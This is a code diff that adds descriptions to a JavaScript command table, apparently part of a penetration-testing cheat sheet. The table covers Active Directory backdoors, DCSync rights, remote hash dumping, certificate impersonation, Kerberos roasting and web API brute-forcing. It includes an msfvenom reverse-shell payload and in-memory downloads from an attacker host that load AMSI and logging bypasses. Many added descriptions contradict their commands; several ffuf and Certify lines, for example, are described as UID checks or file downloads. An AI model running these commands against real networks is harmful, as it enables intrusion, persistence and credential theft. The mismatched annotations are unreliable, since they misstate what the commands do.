@@ -324,31 +324,38 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PowerShell Remoting backdoor",
-          "command": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host> -Verbose"
+          "command": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host> -Verbose",
+          "description": "PowerShell Remoting backdoor. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Remote registry backdoor (read machine secrets)",
-          "command": "Add-RemoteRegBackdoor -ComputerName <host> -Trustee <user> -Verbose"
+          "command": "Add-RemoteRegBackdoor -ComputerName <host> -Trustee <user> -Verbose",
+          "description": "Remote registry backdoor (read machine secrets). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Retrieve the machine account hash remotely",
-          "command": "Get-RemoteMachineAccountHash -ComputerName <host> -Verbose"
+          "command": "Get-RemoteMachineAccountHash -ComputerName <host> -Verbose",
+          "description": "Retrieve the machine account hash remotely. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Set-ADACL - grant rights on an AD object (RACE)",
-          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName <object_dn> -Right <right> -Verbose"
+          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName <object_dn> -Right <right> -Verbose",
+          "description": "Set-ADACL - grant rights on an AD object (RACE). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Retrieve local account hashes remotely",
-          "command": "Get-RemoteLocalAccountHash -ComputerName <host> -Verbose"
+          "command": "Get-RemoteLocalAccountHash -ComputerName <host> -Verbose",
+          "description": "Retrieve local account hashes remotely. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Retrieve domain cached credentials",
-          "command": "Get-RemoteCachedCredential -ComputerName <host> -Verbose"
+          "command": "Get-RemoteCachedCredential -ComputerName <host> -Verbose",
+          "description": "Retrieve domain cached credentials. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Dump hashes across many hosts (Get-PassHashes)",
-          "command": "Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <hostlist>)"
+          "command": "Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <hostlist>)",
+          "description": "Executes a command or script block on a remote machine via PowerShell Remoting (WinRM). Uses the trusted PSRemoting channel for lateral movement - appears as legitimate admin activity."
         }
       ],
       "steps": [
@@ -772,15 +779,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Grant via RACE Set-ADACL",
-          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName '<object_dn>' -Right DCSync -Verbose"
+          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName '<object_dn>' -Right DCSync -Verbose",
+          "description": "Modifies Access Control Lists on Active Directory objects using the AD module. Grants or revokes permissions on target objects for ACL-based privilege escalation."
         },
         {
           "label": "Set-DCPermissions (grant replication/DCSync rights)",
-          "command": "Set-DCPermissions -Method acl -DistinguishedName 'dc=<domain>,dc=local' -User '<user>' -Verbose"
+          "command": "Set-DCPermissions -Method acl -DistinguishedName 'dc=<domain>,dc=local' -User '<user>' -Verbose",
+          "description": "Set-DCPermissions (grant replication/DCSync rights). See the command syntax for exact parameters and flags."
         },
         {
           "label": "AD Module - Set-ADACL GUIDRight DCSync",
-          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName 'DC=<domain>' -GUIDRight DCSync -Verbose"
+          "command": "Set-ADACL -SamAccountName <user> -DistinguishedName 'DC=<domain>' -GUIDRight DCSync -Verbose",
+          "description": "AD Module - Set-ADACL GUIDRight DCSync. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Grants a controlled low-priv user DCSync rights via WriteDACL/GenericAll, a backdoor that survives password resets:\n  Add-DomainObjectAcl       write an ACE onto an object\n  -TargetIdentity 'DC=<domain>,DC=local'   the domain root (where replication rights live)\n  -PrincipalIdentity '<user>'   the account you keep control of\n  -Rights DCSync           the DS-Replication-Get-Changes(-All) rights\nAfterwards that ordinary user can DCSync the domain at will (verify with lsadump::dcsync /user:krbtgt) - no group membership to notice."
@@ -976,7 +986,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Show the SPN values",
-          "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | select name,ServicePrincipalName"
+          "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | select name,ServicePrincipalName",
+          "description": "Finds all AD user accounts with a Service Principal Name (SPN) set - these accounts are vulnerable to Kerberoasting, where their service ticket can be requested and cracked offline to recover the password."
         }
       ],
       "steps": [
@@ -1185,11 +1196,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Just the key fields",
-          "command": "Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID,PDCEmulator"
+          "command": "Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID,PDCEmulator",
+          "description": "Retrieves domain-level metadata including the domain SID, domain controllers, functional level, and naming context. Essential baseline information for constructing tickets, SID history attacks, and understanding the domain architecture."
         },
         {
           "label": "Forest info",
-          "command": "Get-ADForest | select Name,RootDomain,Domains,GlobalCatalogs"
+          "command": "Get-ADForest | select Name,RootDomain,Domains,GlobalCatalogs",
+          "description": "Retrieves forest-level information including root domain, child domains, global catalogs, and forest functional level. Maps the forest topology to identify all domains and potential trust-based attack paths."
         }
       ],
       "explain": "Returns the domain's core identity from the ActiveDirectory module:\n  Get-ADDomain   query the current domain object\nGives the domain/NetBIOS name, domain SID, forest root, functional level, and PDC emulator; the domain SID here is what you need for an ExtraSids golden-ticket across a trust. Add -Identity <domain> to read another domain in the forest."
@@ -1388,7 +1401,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "External/forest trusts only",
-          "command": "Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'"
+          "command": "Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'",
+          "description": "Enumerates Active Directory trust relationships showing direction, type, and trust attributes. Cross-domain and cross-forest trusts create attack paths - a bidirectional trust means you can potentially pivot between domains."
         }
       ],
       "explain": "Lists this domain's trust relationships:\n  Get-ADTrust -Filter *   return every configured trust\nShows each trust's direction (Inbound/Outbound/Bidirectional), type (Forest/External/Realm), and whether SID filtering is on - the first thing to check before attempting a cross-domain/forest attack. Add -Server <domain> to read another domain's trusts."
@@ -1583,7 +1597,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Import the DLL directly (no RSAT install)",
-          "command": "Import-Module .\\Microsoft.ActiveDirectory.Management.dll"
+          "command": "Import-Module .\\Microsoft.ActiveDirectory.Management.dll",
+          "description": "Loads the Active Directory PowerShell module for AD enumeration and management. The DLL can be imported directly without RSAT installation on the target, making it usable from a compromised workstation."
         }
       ],
       "explain": "Loads Microsoft's ActiveDirectory PowerShell module:\n  Import-Module ActiveDirectory   bring the Get-AD* cmdlets into the session\nRequires RSAT (or runs by default on a DC); once loaded you get authoritative, LDAP-backed enumeration cmdlets. Verify with 'Get-Module -Name ActiveDirectory'."
@@ -2341,27 +2356,33 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enumerate CAs",
-          "command": "Certify.exe cas"
+          "command": "Certify.exe cas",
+          "description": "Enumerates Certificate Authorities in the Active Directory forest using Certify. Identifies ADCS infrastructure for certificate-based attack planning."
         },
         {
           "label": "Find vulnerable templates",
-          "command": "Certify.exe find /vulnerable"
+          "command": "Certify.exe find /vulnerable",
+          "description": "Uses Certify to find ADCS certificate templates with exploitable misconfigurations (ESC1-ESC8). Identifies templates that allow privilege escalation through certificate abuse."
         },
         {
           "label": "Find templates where enrollee supplies subject (ESC1)",
-          "command": "Certify.exe find /enrolleeSuppliesSubject"
+          "command": "Certify.exe find /enrolleeSuppliesSubject",
+          "description": "Find templates where enrollee supplies subject (ESC1). See the command syntax for exact parameters and flags."
         },
         {
           "label": "ESC1 with /sid (strong-mapping bypass)",
-          "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:administrator /sid:<target_sid>"
+          "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:administrator /sid:<target_sid>",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Windows openssl CSP conversion to PFX",
-          "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx"
+          "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx",
+          "description": "Uses OpenSSL for cryptographic operations - encryption, decryption, certificate management, or secure connections."
         },
         {
           "label": "EA impersonation via /altname",
-          "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:<domain>\\Administrator"
+          "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:<domain>\\Administrator",
+          "description": "Uses Certify to request a certificate from a vulnerable template. Exploits misconfigured templates to obtain a certificate for another user (e.g., Domain Admin) for authentication."
         }
       ],
       "explain": "Requests a certificate from an ESC1 template (enrollee supplies the subject) to impersonate any user:\n  request                   enroll a certificate\n  /ca:<ca_server>\\<ca_name> the issuing CA to submit to\n  /template:<template_name> the ENROLLEE_SUPPLIES_SUBJECT template\n  /altname:<user>           the account to impersonate (set to Administrator for DA)\nYou receive a cert as that user; convert PEM to PFX and feed it to Rubeus asktgt to PKINIT and get their TGT (/ptt injects it)."
@@ -4143,35 +4164,43 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Computers + OS (spot the DCs/servers)",
-          "command": "Get-ADComputer -Filter * -Properties OperatingSystem | select Name,OperatingSystem,DNSHostName"
+          "command": "Get-ADComputer -Filter * -Properties OperatingSystem | select Name,OperatingSystem,DNSHostName",
+          "description": "Enumerates all computer objects in AD with their operating system details. Use this to identify domain controllers, servers, and workstations - older OS versions may have unpatched vulnerabilities."
         },
         {
           "label": "Organizational Units",
-          "command": "Get-ADOrganizationalUnit -Filter * | select Name,DistinguishedName"
+          "command": "Get-ADOrganizationalUnit -Filter * | select Name,DistinguishedName",
+          "description": "Lists all Organizational Units (OUs) in the domain. OUs define the administrative boundary structure and GPO application scope - understanding the OU tree helps target specific departments and identify where GPO-based attacks will land."
         },
         {
           "label": "Domain trusts",
-          "command": "Get-ADTrust -Filter * | select Source,Target,Direction,TrustType"
+          "command": "Get-ADTrust -Filter * | select Source,Target,Direction,TrustType",
+          "description": "Enumerates Active Directory trust relationships showing direction, type, and trust attributes. Cross-domain and cross-forest trusts create attack paths - a bidirectional trust means you can potentially pivot between domains."
         },
         {
           "label": "Forest / global catalogs",
-          "command": "Get-ADForest | select Name,RootDomain,Domains,GlobalCatalogs"
+          "command": "Get-ADForest | select Name,RootDomain,Domains,GlobalCatalogs",
+          "description": "Retrieves forest-level information including root domain, child domains, global catalogs, and forest functional level. Maps the forest topology to identify all domains and potential trust-based attack paths."
         },
         {
           "label": "LDAP recursive memberOf (nested group resolution via 1.2.840.113556.1.4.1941)",
-          "command": "Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=<user_DN>)' | select Name"
+          "command": "Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=<user_DN>)' | select Name",
+          "description": "Resolves nested group memberships using the LDAP_MATCHING_RULE_IN_CHAIN OID. Finds all groups a user belongs to through any depth of nesting, revealing indirect privilege paths that flat lookups miss."
         },
         {
           "label": "LDAP recursive members of a group (1941)",
-          "command": "Get-ADUser -LDAPFilter '(memberOf:1.2.840.113556.1.4.1941:=<group_DN>)'"
+          "command": "Get-ADUser -LDAPFilter '(memberOf:1.2.840.113556.1.4.1941:=<group_DN>)'",
+          "description": "Performs recursive (nested) group membership resolution using the LDAP_MATCHING_RULE_IN_CHAIN OID. Finds users who are members of a group through any level of nesting - critical for finding hidden privilege paths that flat membership queries miss."
         },
         {
           "label": "LDAP bitwise OR filter (1.2.840.113556.1.4.804)",
-          "command": "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.804:=<bitmask>)'"
+          "command": "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.804:=<bitmask>)'",
+          "description": "Finds accounts with Kerberos pre-authentication disabled (userAccountControl flag 0x400000). These accounts are vulnerable to AS-REP Roasting - their AS-REP can be requested without credentials and cracked offline."
         },
         {
           "label": "Ping sweep via AD Module",
-          "command": "Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}"
+          "command": "Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}",
+          "description": "Lists all computer accounts joined to the domain. Provides a full inventory of machines for network mapping, identifying targets, and understanding the environment scope."
         }
       ],
       "explain": "Uses the signed Microsoft ActiveDirectory module (stealthier than PowerView, it is legitimate admin tooling) to enumerate the domain:\n  Get-ADDomain             pull core domain facts\n  | select DNSRoot,NetBIOSName,DomainSID,PDCEmulator   the name, SID, and PDC you need for later attacks\nSwap the cmdlet to map targets: Get-ADUser -Filter for Kerberoastable/AS-REP accounts, Get-ADGroupMember 'Domain Admins' -Recursive, Get-ADTrust for trusts."
@@ -4402,23 +4431,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Kerberoastable users (has SPN)",
-          "command": "Get-ADUser -LDAPFilter '(&(objectClass=user)(servicePrincipalName=*))' -Properties servicePrincipalName | select samaccountname"
+          "command": "Get-ADUser -LDAPFilter '(&(objectClass=user)(servicePrincipalName=*))' -Properties servicePrincipalName | select samaccountname",
+          "description": "Finds all AD user accounts with a Service Principal Name (SPN) set - these accounts are vulnerable to Kerberoasting, where their service ticket can be requested and cracked offline to recover the password."
         },
         {
           "label": "Protected Users group members",
-          "command": "Get-ADGroupMember -Identity 'Protected Users'"
+          "command": "Get-ADGroupMember -Identity 'Protected Users'",
+          "description": "Queries Active Directory group objects to enumerate group memberships and identify privilege relationships."
         },
         {
           "label": "Disabled accounts (LDAP bitwise)",
-          "command": "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select samaccountname"
+          "command": "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select samaccountname",
+          "description": "Queries Active Directory user objects with specific filters to identify accounts of interest for further enumeration or attack."
         },
         {
           "label": "OU-scoped user search",
-          "command": "Get-ADUser -SearchBase 'OU=Servers,DC=<domain>' -Filter * | select samaccountname"
+          "command": "Get-ADUser -SearchBase 'OU=Servers,DC=<domain>' -Filter * | select samaccountname",
+          "description": "Searches for user accounts within a specific Organizational Unit (OU). Scoping enumeration to an OU helps focus on a particular department or admin boundary rather than enumerating the entire domain."
         },
         {
           "label": "PowerView equivalents",
-          "command": "Get-DomainUser -PreauthNotRequired; Get-DomainComputer -Unconstrained; Get-DomainUser -AdminCount"
+          "command": "Get-DomainUser -PreauthNotRequired; Get-DomainComputer -Unconstrained; Get-DomainUser -AdminCount",
+          "description": "Uses PowerView to find accounts with Kerberos pre-auth disabled. These are AS-REP Roastable - you can request and crack their authentication data without needing any credentials."
         }
       ],
       "explain": "A set of LDAP / AD-module filter queries that pinpoint attack targets without noisy full dumps. The lead example finds AS-REP roastable accounts:\n  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}   accounts with pre-auth disabled\n  -Properties DoesNotRequirePreAuth   include that attribute in the output\nOther queries in the set cover Kerberoastable (servicePrincipalName=*), disabled accounts (userAccountControl bitwise), adminCount=1, Protected Users, and OU-scoped searches - each returns just the principals worth attacking."
@@ -4616,7 +4650,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Resolve records too",
-          "command": "adidnsdump -u <domain>\\<user> -p <password> ldap://<dc_ip> -r"
+          "command": "adidnsdump -u <domain>\\<user> -p <password> ldap://<dc_ip> -r",
+          "description": "Dumps all DNS records from the Active Directory-integrated DNS zone. Reveals internal hostnames that standard DNS queries and zone transfers cannot access."
         }
       ],
       "explain": "Dumps every AD-Integrated DNS record over LDAP:\n  adidnsdump          the collector\n  -u <domain>\\<user>   authenticate as any domain user\n  ldap://<dc_ip>      the DC's LDAP service to query\n  -r                  resolve records the tool cannot read directly by querying them by node name\nWrites records.csv mapping internal hostnames to IPs (servers, infra that plain DNS lookups hide) - a fast internal map with only a low-priv account."
@@ -4813,23 +4848,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Trigger SDProp immediately",
-          "command": "Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose"
+          "command": "Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose",
+          "description": "Trigger SDProp immediately. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Grant ResetPassword/WriteMembers on AdminSDHolder",
-          "command": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>' -PrincipalIdentity <user> -Rights WriteMembers -Verbose"
+          "command": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>' -PrincipalIdentity <user> -Rights WriteMembers -Verbose",
+          "description": "Adds an Access Control Entry (ACE) to a domain object using PowerView. Used to grant yourself or a controlled account additional permissions on the target object for privilege escalation."
         },
         {
           "label": "AD Module - Set-DCPermissions (AdminSDHolder)",
-          "command": "Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -DistinguishedName 'CN=<user>,CN=Users,DC=<domain>' -Verbose"
+          "command": "Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -DistinguishedName 'CN=<user>,CN=Users,DC=<domain>' -Verbose",
+          "description": "AD Module - Set-DCPermissions (AdminSDHolder). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Abuse - add self to Domain Admins",
-          "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> -Verbose"
+          "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> -Verbose",
+          "description": "Adds a user to a domain group using PowerView. If you have write access to a privileged group (e.g., via GenericAll or GenericWrite ACL), you can add yourself or a controlled account to escalate privileges."
         },
         {
           "label": "Abuse - reset a protected user's password",
-          "command": "Set-DomainUserPassword -Identity <target_account> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) -Verbose"
+          "command": "Set-DomainUserPassword -Identity <target_account> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) -Verbose",
+          "description": "Abuse - reset a protected user's password. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Backdoors AdminSDHolder so its ACL propagates to every protected group via SDProp:\n  Add-DomainObjectAcl       write an ACE\n  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=local'   the template object whose DACL SDProp copies out\n  -PrincipalIdentity '<user>'   the account you control\n  -Rights All              GenericAll (or WriteMembers/ResetPassword)\nEvery ~60 min SDProp stamps this ACL onto Domain Admins/Enterprise Admins/Administrators, so <user> can re-grant itself DA - persistent even after cleanup of the groups themselves. Invoke-SDPropagator forces it immediately."
@@ -5156,15 +5196,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Confirm both registry keys are set",
-          "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+          "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "description": "Checks if the AlwaysInstallElevated policy is set. When enabled in both HKLM and HKCU, any user can install MSI packages as SYSTEM - a direct privilege escalation path."
         },
         {
           "label": "PowerUp exploit (adds admin)",
-          "command": "Write-UserAddMSI"
+          "command": "Write-UserAddMSI",
+          "description": "PowerUp exploit (adds admin). See the command syntax for exact parameters and flags."
         },
         {
           "label": "msfvenom MSI payload",
-          "command": "msfvenom -p windows/x64/shell_reverse_tcp lhost=<lhost> lport=<lport> -f msi -o aie.msi"
+          "command": "msfvenom -p windows/x64/shell_reverse_tcp lhost=<lhost> lport=<lport> -f msi -o aie.msi",
+          "description": "Generates a Windows reverse shell payload with msfvenom. Creates an executable or shellcode that connects back to your listener when run on the target."
         }
       ],
       "steps": [
@@ -5213,15 +5256,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Script Block Logging bypass",
-          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/sbloggingbypass.txt')"
+          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/sbloggingbypass.txt')",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         },
         {
           "label": "AMSI bypass",
-          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/Amsi-Byp.txt')"
+          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/Amsi-Byp.txt')",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         },
         {
           "label": "Then load a tool in-memory",
-          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/PowerView.ps1')"
+          "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/PowerView.ps1')",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         }
       ],
       "steps": [
@@ -6131,12 +6177,14 @@ const COMMAND_DATA = {
         {
           "command": "for i in $(seq 1 100); do curl -s -X GET \"http://<target>/api/v1/<endpoint>/$i\" -H \"Authorization: Bearer <jwt_token>\" | jq '.id,.email,.name' 2>/dev/null; done",
           "caption": "Larger range - extract only key fields with jq",
-          "label": "Loop IDs 1-100 (users)"
+          "label": "Loop IDs 1-100 (users)",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "command": "for ((i=1; i<=20; i++)); do echo -n \"ID $i: \"; curl -s -X GET \"http://<target>/api/v1/suppliers/quarterly-reports/$i\" -H \"Authorization: Bearer <jwt_token>\" | jq -r '.[] | .reportDate' 2>/dev/null; done",
           "caption": "Enumerate report endpoint - extract specific field per object",
-          "label": "Loop IDs 1-20 (reports)"
+          "label": "Loop IDs 1-20 (reports)",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "examples": [
@@ -6316,22 +6364,26 @@ const COMMAND_DATA = {
         {
           "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<known_email>\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 50",
           "caption": "Password spray against single known email address",
-          "label": "Brute password (known email)"
+          "label": "Brute password (known email)",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "command": "curl -X POST http://<target>/api/v1/authentication/customers/passwords/resets/email-otps -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\"}'\nffuf -u http://<target>/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\", \"OTP\": \"FUZZ\", \"NewPassword\": \"NewP@ssw0rd1\"}' -w <(seq -w 0000 9999):FUZZ -t 50 -mr '\"SuccessStatus\":true'",
           "caption": "OTP brute-force: trigger reset then immediately fuzz 4-digit OTP (0000-9999)",
-          "label": "POST request"
+          "label": "POST request",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "command": "ffuf -w <userlist>:EMAIL -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"<common_pass>\"}' -fr \"Invalid Credentials\" -mc 200",
           "caption": "Username/email enumeration with fixed password",
-          "label": "Brute email (known password)"
+          "label": "Brute email (known password)",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "command": "ffuf -w <wordlist>:PASS -u http://<target>/api/v1/authentication/sign-in -X POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer <jwt>\" -d '{\"currentPassword\": \"PASS\", \"newPassword\": \"NewPass1!\"}' -fr \"incorrect\" -t 30",
           "caption": "Brute-force authenticated password-change endpoint",
-          "label": "Brute current-password (change-pw)"
+          "label": "Brute current-password (change-pw)",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         }
       ],
       "examples": [
@@ -6513,27 +6565,32 @@ const COMMAND_DATA = {
         {
           "command": "for ver in v0 v1 v2 v3 beta legacy internal; do echo \"=== $ver ===\"; curl -s http://<target>/api/$ver/<endpoint> -H \"Authorization: Bearer <jwt_token>\" | jq; done",
           "caption": "Probe multiple version prefixes in a loop",
-          "label": "Batch loop"
+          "label": "Batch loop",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "command": "curl -s http://<target>/api/v0/customers/deleted -H \"Authorization: Bearer <jwt_token>\" | jq",
           "caption": "Access soft-deleted records via old API version",
-          "label": "GET request"
+          "label": "GET request",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "command": "curl -s http://<target>/swagger/v1/swagger.json | jq '.paths | keys[]'",
           "caption": "Dump all API paths from Swagger spec to discover old/hidden endpoints",
-          "label": "Swagger - /swagger/v1"
+          "label": "Swagger - /swagger/v1",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "command": "curl -s http://<target>/api-docs | jq '.paths | keys[]'",
           "caption": "OpenAPI spec - alternative path for endpoint discovery",
-          "label": "Swagger - /api-docs"
+          "label": "Swagger - /api-docs",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "command": "ffuf -u http://<target>/api/FUZZ/<endpoint> -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H \"Authorization: Bearer <jwt_token>\" -mc 200,201,301",
           "caption": "Fuzz API version and prefix with ffuf",
-          "label": "ffuf brute"
+          "label": "ffuf brute",
+          "description": "Fuzzes web directories or URL parameters using ffuf. Discovers hidden content, API endpoints, and parameters by brute-forcing URL paths."
         }
       ],
       "examples": [
@@ -7355,11 +7412,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Larger port set",
-          "command": "cat web_discovery.xml | ./aquatone -nmap -ports large"
+          "command": "cat web_discovery.xml | ./aquatone -nmap -ports large",
+          "description": "Reads the contents of a file for information gathering. Target files often contain credentials, configuration details, or sensitive data."
         },
         {
           "label": "Plain host list",
-          "command": "cat hosts.txt | ./aquatone"
+          "command": "cat hosts.txt | ./aquatone",
+          "description": "Reads a sensitive system file that may contain credentials, SSH keys, or security-relevant configuration. Standard post-exploitation enumeration step."
         }
       ],
       "explain": "Screenshots web hosts from an Nmap XML for visual triage:\n  cat web_discovery.xml   the nmap XML from the discovery scan\n  | ./aquatone -nmap      parse it as nmap input and capture each host\nProduces an HTML gallery so you can eyeball many sites at once and spot login/admin/default pages; -ports large widens the port set."
@@ -7691,11 +7750,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Crack AS-REP hashes (John)",
-          "command": "john.exe --wordlist=<wordlist> <hashfile>"
+          "command": "john.exe --wordlist=<wordlist> <hashfile>",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "Crack AS-REP (hashcat m18200)",
-          "command": "hashcat -m 18200 <hashfile> <wordlist>"
+          "command": "hashcat -m 18200 <hashfile> <wordlist>",
+          "description": "Cracks AS-REP hashes from AS-REP Roasting (hashcat mode 18200). Brute-forces passwords for accounts with Kerberos pre-auth disabled."
         }
       ],
       "explain": "Roasts every account with Kerberos pre-auth disabled - no credentials needed:\n  asreproast               request AS-REP responses for all UF_DONT_REQUIRE_PREAUTH accounts (add /user:<user> to target one)\n  /format:hashcat          emit in hashcat crackable format\n  /nowrap                  do not line-wrap the hash (one line, easy to copy)\n  /outfile:asrep_hashes.txt save the hashes\nCrack offline with hashcat -m 18200 to recover the account passwords."
@@ -7908,7 +7969,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Specific user",
-          "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap"
+          "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap",
+          "description": "Uses Rubeus to perform AS-REP Roasting - identifies and requests authentication data for accounts without pre-authentication. The output can be cracked offline to recover passwords."
         }
       ],
       "steps": [
@@ -8475,11 +8537,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "DFSCoerce",
-          "command": "DFSCoerce-andrea.exe -t <target_dc> -l <listener_host>"
+          "command": "DFSCoerce-andrea.exe -t <target_dc> -l <listener_host>",
+          "description": "Exploits the DFS (Distributed File System) service to coerce NTLM authentication from a domain controller. Forces the DC to authenticate to your listener for relay attacks."
         },
         {
           "label": "WSPCoerce (via Loader, in-memory)",
-          "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <target_dc> <listener_host>"
+          "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <target_dc> <listener_host>",
